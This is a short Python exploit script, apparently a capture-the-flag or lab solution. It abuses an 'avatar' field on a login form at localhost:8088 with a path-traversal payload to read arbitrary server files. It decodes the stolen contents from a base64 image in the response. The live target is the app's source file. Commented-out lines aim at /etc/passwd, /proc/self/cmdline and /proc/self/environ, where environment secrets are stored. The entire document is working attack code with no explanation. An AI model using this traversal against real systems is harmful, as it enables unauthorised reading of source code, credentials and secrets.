import requests
import random
import string
import base64
import re

#target = "/etc/passwd"
#target = "/proc/self/cmdline"
#target = "/proc/self/environ"
target = "/app/app.py"



def randstr():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])

r = requests.post("http://localhost:8088/login", data={"username": randstr(), "password": "12345", "avatar": "../../../../.." + target, "submit": "Go!"})
resp = r.text

pattern = r'"data:image/png;base64,(.*?)"'
b64 = re.search(pattern, resp).group(1)

print(base64.b64decode(b64).decode())